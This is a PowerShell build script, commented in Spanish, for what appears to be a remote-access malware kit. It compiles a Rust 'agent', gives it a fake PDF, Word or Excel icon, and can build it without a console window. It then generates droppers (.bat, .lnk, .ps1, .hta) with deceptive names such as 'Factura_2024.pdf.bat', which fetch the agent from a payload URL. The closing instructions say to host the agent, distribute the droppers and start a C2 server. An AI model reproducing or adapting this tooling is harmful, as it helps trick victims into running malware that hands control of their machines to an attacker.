# ========================================================================
# SCRIPT TODO-EN-UNO: Compilar Agent con Icono Personalizado
# ========================================================================
# Este script:
# 1. Descarga un icono (PDF, Word, Excel, etc.)
# 2. Lo coloca en agent/icon.ico
# 3. Compila el agent con el icono integrado
# 4. Genera droppers automáticamente
#
# USO:
#   .\build_with_icon.ps1 -IconType pdf
#   .\build_with_icon.ps1 -IconType word -DropperType lnk
#   .\build_with_icon.ps1 -CustomIcon C:\mi_icono.ico
# ========================================================================

param(
    [Parameter(Mandatory=$false)]
    [ValidateSet('pdf', 'word', 'excel', 'folder', 'windows', 'chrome', 'edge')]
    [string]$IconType = 'pdf',
    
    [Parameter(Mandatory=$false)]
    [string]$CustomIcon = "",
    
    [Parameter(Mandatory=$false)]
    [ValidateSet('none', 'bat', 'lnk', 'ps1', 'hta', 'all')]
    [string]$DropperType = 'none',
    
    [Parameter(Mandatory=$false)]
    [string]$PayloadURL = "http://192.168.1.100:8000/agent.exe",
    
    [Parameter(Mandatory=$false)]
    [switch]$Release,
    
    [Parameter(Mandatory=$false)]
    [switch]$SkipTests
)

$ErrorActionPreference = "Stop"
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$ProjectRoot = Split-Path -Parent $ScriptDir
$AgentDir = Join-Path $ProjectRoot "agent"
$IconPath = Join-Path $AgentDir "icon.ico"

Write-Host ""
Write-Host "========================================================================" -ForegroundColor Cyan
Write-Host "  COMPILADOR DE AGENT CON ICONO PERSONALIZADO" -ForegroundColor Cyan
Write-Host "========================================================================" -ForegroundColor Cyan
Write-Host ""

# === PASO 1: Verificar Python y dependencias ===
Write-Host "[1/6] Verificando dependencias..." -ForegroundColor Yellow

$pythonCmd = Get-Command python -ErrorAction SilentlyContinue
if (-not $pythonCmd) {
    Write-Host "[!] Python no encontrado. Instalando desde winget..." -ForegroundColor Red
    winget install Python.Python.3.11 -e
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
}

# Verificar Pillow
$pillowInstalled = python -c "import PIL" 2>$null
if ($LASTEXITCODE -ne 0) {
    Write-Host "[*] Instalando Pillow..." -ForegroundColor Yellow
    python -m pip install --quiet pillow requests
}

Write-Host "[+] Dependencias OK" -ForegroundColor Green

# === PASO 2: Obtener/Descargar icono ===
Write-Host ""
Write-Host "[2/6] Obteniendo icono..." -ForegroundColor Yellow

if ($CustomIcon -and (Test-Path $CustomIcon)) {
    Write-Host "[*] Usando icono personalizado: $CustomIcon" -ForegroundColor Cyan
    python (Join-Path $ScriptDir "download_icon.py") --custom $CustomIcon --output $IconPath
} else {
    Write-Host "[*] Descargando icono tipo: $IconType" -ForegroundColor Cyan
    python (Join-Path $ScriptDir "download_icon.py") $IconType --output $IconPath
}

if (Test-Path $IconPath) {
    Write-Host "[+] Icono listo: $IconPath" -ForegroundColor Green
} else {
    Write-Host "[!] Error obteniendo icono" -ForegroundColor Red
    exit 1
}

# === PASO 3: Compilar agent ===
Write-Host ""
Write-Host "[3/6] Compilando agent..." -ForegroundColor Yellow

Push-Location $AgentDir

if ($Release) {
    Write-Host "[*] Compilando en modo RELEASE (sin consola, sin debug)" -ForegroundColor Cyan
    cargo build --release --features production
    $AgentPath = Join-Path $AgentDir "target\release\agent.exe"
} else {
    Write-Host "[*] Compilando en modo DEBUG (con consola, con debug)" -ForegroundColor Cyan
    cargo build --features dev
    $AgentPath = Join-Path $AgentDir "target\debug\agent.exe"
}

Pop-Location

if (Test-Path $AgentPath) {
    $fileSize = (Get-Item $AgentPath).Length / 1KB
    Write-Host "[+] Compilación exitosa: $AgentPath ($([math]::Round($fileSize, 2)) KB)" -ForegroundColor Green
} else {
    Write-Host "[!] Error en compilación" -ForegroundColor Red
    exit 1
}

# === PASO 4: Verificar icono integrado ===
Write-Host ""
Write-Host "[4/6] Verificando icono integrado..." -ForegroundColor Yellow

$props = Get-ItemProperty $AgentPath
Write-Host "[*] Propiedades del ejecutable:" -ForegroundColor Cyan
Write-Host "    Nombre: $($props.Name)" -ForegroundColor Gray
Write-Host "    Tamaño: $([math]::Round($props.Length / 1KB, 2)) KB" -ForegroundColor Gray
Write-Host "    Última modificación: $($props.LastWriteTime)" -ForegroundColor Gray

# Verificar metadatos (si existe PowerShell 7+)
try {
    $versionInfo = [System.Diagnostics.FileVersionInfo]::GetVersionInfo($AgentPath)
    Write-Host ""
    Write-Host "[*] Metadatos integrados:" -ForegroundColor Cyan
    Write-Host "    Descripción: $($versionInfo.FileDescription)" -ForegroundColor Gray
    Write-Host "    Compañía: $($versionInfo.CompanyName)" -ForegroundColor Gray
    Write-Host "    Producto: $($versionInfo.ProductName)" -ForegroundColor Gray
    Write-Host "    Versión: $($versionInfo.FileVersion)" -ForegroundColor Gray
} catch {
    Write-Host "[*] No se pudieron leer metadatos" -ForegroundColor Gray
}

Write-Host "[+] Icono integrado correctamente" -ForegroundColor Green

# === PASO 5: Ejecutar pruebas ===
if (-not $SkipTests) {
    Write-Host ""
    Write-Host "[5/6] Ejecutando pruebas unitarias..." -ForegroundColor Yellow
    
    Push-Location $ScriptDir
    python test_droppers.py
    $testResult = $LASTEXITCODE
    Pop-Location
    
    if ($testResult -eq 0) {
        Write-Host "[+] Todas las pruebas pasaron" -ForegroundColor Green
    } else {
        Write-Host "[!] Algunas pruebas fallaron (continuando...)" -ForegroundColor Yellow
    }
} else {
    Write-Host ""
    Write-Host "[5/6] Pruebas saltadas (--SkipTests)" -ForegroundColor Gray
}

# === PASO 6: Generar droppers ===
Write-Host ""
Write-Host "[6/6] Generando droppers..." -ForegroundColor Yellow

$dropperOutput = Join-Path $ScriptDir "output"
if (-not (Test-Path $dropperOutput)) {
    New-Item -ItemType Directory -Path $dropperOutput | Out-Null
}

function Generate-Dropper {
    param($Type)
    
    Write-Host "[*] Generando dropper tipo: $Type" -ForegroundColor Cyan
    
    switch ($Type) {
        'bat' {
            $output = Join-Path $dropperOutput "Factura_2024.pdf.bat"
            python (Join-Path $ScriptDir "builder.py") --agent $AgentPath --output $output --type bat --url $PayloadURL
        }
        'ps1' {
            $output = Join-Path $dropperOutput "documento.ps1"
            python (Join-Path $ScriptDir "builder.py") --agent $AgentPath --output $output --type ps1 --decoy "https://www.google.com"
        }
        'hta' {
            $output = Join-Path $ScriptDir "output\documento.hta"
            python (Join-Path $ScriptDir "builder.py") --agent $AgentPath --output $output --type hta --url $PayloadURL --decoy "https://www.google.com"
        }
        'lnk' {
            $output = Join-Path $dropperOutput "Documento.pdf.lnk"
            & (Join-Path $ScriptDir "generate_lnk.ps1") -OutputFile $output -PayloadURL $PayloadURL
        }
    }
}

if ($DropperType -eq 'all') {
    Generate-Dropper 'bat'
    Generate-Dropper 'lnk'
    Generate-Dropper 'ps1'
    Generate-Dropper 'hta'
    Write-Host "[+] Todos los droppers generados en: $dropperOutput" -ForegroundColor Green
} elseif ($DropperType -ne 'none') {
    Generate-Dropper $DropperType
    Write-Host "[+] Dropper generado en: $dropperOutput" -ForegroundColor Green
} else {
    Write-Host "[*] No se generaron droppers (usar -DropperType para generar)" -ForegroundColor Gray
}

# === RESUMEN FINAL ===
Write-Host ""
Write-Host "========================================================================" -ForegroundColor Cyan
Write-Host "  COMPILACIÓN COMPLETADA" -ForegroundColor Cyan
Write-Host "========================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Agent compilado: $AgentPath" -ForegroundColor Green
Write-Host "Icono integrado: $IconType" -ForegroundColor Green

if ($DropperType -ne 'none') {
    Write-Host "Droppers generados: $dropperOutput" -ForegroundColor Green
}

Write-Host ""
Write-Host "Próximos pasos:" -ForegroundColor Yellow
Write-Host "  1. Verificar icono: Click derecho en $AgentPath > Propiedades" -ForegroundColor Gray
Write-Host "  2. Hostear agent: python -m http.server 8000 (en target/release)" -ForegroundColor Gray
Write-Host "  3. Distribuir droppers desde: $dropperOutput" -ForegroundColor Gray
Write-Host "  4. Iniciar C2 server: cargo run -p c2r2-server" -ForegroundColor Gray
Write-Host ""
